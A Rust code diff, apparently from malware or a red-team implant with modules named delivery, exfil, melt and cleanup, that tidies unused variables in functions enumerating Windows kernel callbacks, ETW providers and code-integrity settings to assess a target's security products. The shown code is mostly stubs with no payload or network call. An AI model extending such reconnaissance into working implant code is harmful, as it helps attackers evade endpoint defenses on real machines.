@@ -26,7 +26,7 @@ pub mod melt;
 pub mod delivery;
 
 use core::ffi::c_void;
-use crate::heap::{String, Vec};
+use crate::heap::Vec;
 pub mod exfil;
 pub mod cleanup;
 
@@ -606,7 +606,7 @@ unsafe fn enumerate_process_callbacks(
 }
 
 unsafe fn enumerate_image_load_callbacks(
-    rw: &dyn KernelReadWrite,
+    _rw: &dyn KernelReadWrite,
     posture: &mut KernelPosture,
 ) {
     // PsSetLoadImageNotifyRoutine → PspLoadImageNotifyRoutine array
@@ -623,7 +623,7 @@ unsafe fn enumerate_image_load_callbacks(
 }
 
 unsafe fn enumerate_registry_callbacks(
-    rw: &dyn KernelReadWrite,
+    _rw: &dyn KernelReadWrite,
     posture: &mut KernelPosture,
 ) {
     // CmRegisterCallback → CmpCallBackVector
@@ -850,8 +850,8 @@ unsafe fn wcslen(s: *const u16) -> usize {
     n
 }
 
-unsafe fn wide_slice_to_utf8(w: &[u16]) -> &str { "" }
-unsafe fn wide_to_utf8(w: &[u16]) -> &str { "" }
+unsafe fn wide_slice_to_utf8(_w: &[u16]) -> &str { "" }
+unsafe fn wide_to_utf8(_w: &[u16]) -> &str { "" }
 
 unsafe fn get_process_mitigation_policy(
     _h: isize, _policy: u32, _buf: *mut core::ffi::c_void, _len: u32,
@@ -868,7 +868,7 @@ unsafe fn probe_etw_provider_enabled(_guid: &[u8; 16]) -> bool { false }
 
 #[repr(C)] struct CodeIntegrityInfo { code_integrity_options: u32, _pad: [u32; 4] }
 
-fn alloc(sz: usize) -> *mut u8 { core::ptr::null_mut() }
+fn alloc(_sz: usize) -> *mut u8 { core::ptr::null_mut() }
 fn free(_p: *mut u8) {}
 fn merge_or_push(products: &mut Vec<DetectedProduct>, product: DetectedProduct) {
     for p in products.iter_mut() {
@@ -926,7 +926,7 @@ unsafe fn write_report(a: &TargetAssessment) {
 
     let create: FnCF = core::mem::transmute(cf);
     let write: FnWF = core::mem::transmute(wf);
-    let close: FnCH = core::mem::transmute(ch);
+    let _close: FnCH = core::mem::transmute(ch);
 
     let path: [u16; 48] = {
         let s = b"C:\\nyx\\trex_report.txt";
@@ -965,6 +965,7 @@ unsafe fn write_report(a: &TargetAssessment) {
     let _ = write(h, b"\r\n".as_ptr(), 2, &mut written, core::ptr::null_mut());
 }
 
+#[allow(dead_code)]
 fn format_tier_num(t: u32) -> [u8; 8] {
     let mut buf = [b' ' as u8; 8];
     buf[0] = b'(';
